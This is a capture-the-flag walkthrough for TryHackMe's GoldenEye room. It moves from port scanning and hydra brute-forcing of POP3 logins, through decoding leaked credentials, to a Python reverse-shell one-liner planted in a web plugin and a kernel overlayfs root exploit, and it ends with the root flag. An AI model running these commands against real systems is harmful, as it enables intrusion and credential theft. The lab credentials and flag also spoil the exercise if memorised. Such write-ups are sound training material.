This write up is for TryHackMe's medium CTF called GoldenEye

Task 1: Intro and Enumeration
To begin I nmap the IP
nmap -n -v -sT -p- -T5 <ip>

4 ports are open

I decided to check the websites source code out, it seems to be some comments left by the SWE


// contacting a user named boris
// left encoded password
// mentioned another person named Natalya

from my assumption since it was directed towards boris, im going to take that as the username
 // another named mentioned is natalya
Username : boris
Encoded password : &#73;&#110;&#118;&#105;&#110;&#99;&#105;&#98;&#108;&#101;&#72;&#97;&#99;&#107;&#51;&#114;
// A simple search showed me its HTML encoding, i used this website to decode the text https://www.site24x7.com/tools/html-encoder.html also you can use dcode <code> in terminal
Decoded password : InvincibleHack3r

Task 2: Its mail time
using telnet <ip> <port> //port being 55007 to check if credentials are reusable
it looks like the authentication failed

now it hints us to using hydra to crack the new password 
hydra -l <username> -P <path to the list of passwords> <IP address> -s <port number> <service name>

password: secret1!

now using telnet again we can connect to the pop3 service 
└─$ telnet 10.10.251.131 55007                                                             
Trying 10.10.251.131...
Connected to 10.10.251.131.
Escape character is '^]'.
+OK GoldenEye POP3 Electronic-Mail System
user boris
+OK
pass secret1!
+OK Logged in.

Success!!!
Now we can do list to check the list of messages 
+OK 3 messages:
1 544
2 373
3 921
there are 3 mails, 1, 2, and 3, we can do retr <num> to retreieve each mail piece 
retr<1>
retr<2>
retr<3>

another username is -Xenia

using hydra again with the same format we find her password - bird
telnet <ip> <port> 
retreieve her emails as well
in the second email i was able to find her creds and other details
her password is RCP90rulez
"If you remembered in some of the emails you discovered, there is the severnaya-station.com website. To get this working, you need up update your DNS records to reveal it.

If you're on Linux edit your "/etc/hosts" file and add:

<machines ip> severnaya-station.com"

so do sudo nano/etc/hosts 
then add <machines ip> severnaya-station.com
now you can go to this website http://severnaya-station.com/gnocertdir/

trying the username and passwords i have this is the one that worked
user : Xenia
pass : RCP90rulez!

under my profile i see a message from dr doak
reading the message i find
My email username is...

doak 
using hydra again 
hydra -l Doak -P /usr/share/set/src/fasttrack/wordlist.txt 10.10.221.192 -s 55007 pop3
password : goat
using telnet again we find the doaks username: dr_doak and password : 4England!

signing in with dr doaks creds i search through the station

i find in his private files a text file called s3cret.txt
007,

I was able to capture this apps adm1n cr3ds through clear txt. 

Text throughout most web apps within the GoldenEye servers are scanned, so I cannot add the cr3dentials here. 

Something juicy is located here: /dir007key/for-007.jpg

Also as you may know, the RCP-90 is vastly superior to any other weapon and License to Kill is the only way to play.

after downloading the .jpg file using wget use exiftool to get all the details of the file

seems to be a base64 string encoded under description
echo eFdpbnRlckE50TV4IQ== | base64 -d

user:admin
pass:xWinter1995x!

i used pentest monkey cheat sheet to create a reverse shell
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<IP>”,<Port number>))
you can use any port you want 
add the python script in the spell checked plugin and then you can start listening using pwncat

pwncat --listen -p 9999
boom, straight to the shell

kernal version - 3.13.0–32-generic
	

create new user and mount namespace using clone with CLONE_NEWUSER|CLONE_NEWNS flags.
 Mount an overlayfs using /bin as lower filesystem, some temporary directories as upper and work directory.
 Overlayfs mount would only be visible within user namespace, so let namespace process change CWD to overlayfs, thus making the overlayfs also visible outside the namespace via the proc filesystem.
 Make su on overlayfs world writable without changing the owner
Let process outside user namespace write arbitrary content to the file applying a slightly modified variant of the SetgidDirectoryPrivilegeEscalation exploit.
Execute the modified su binary
 this is the link to the exploit : https://www.exploit-db.com/exploits/37292

    upload <filename> <destination>
    upload explot.c/tmp
    cd/tmp
    cc explot.c -o exploit
    run the exploit
    
    ./exploit
    
    boom got to the root!
    
    cd/root 
    ls -la
    
    cat flag.txt
    
    root flag  -  568628e0d993b1973adc718237da6e93
    
    Thank you!
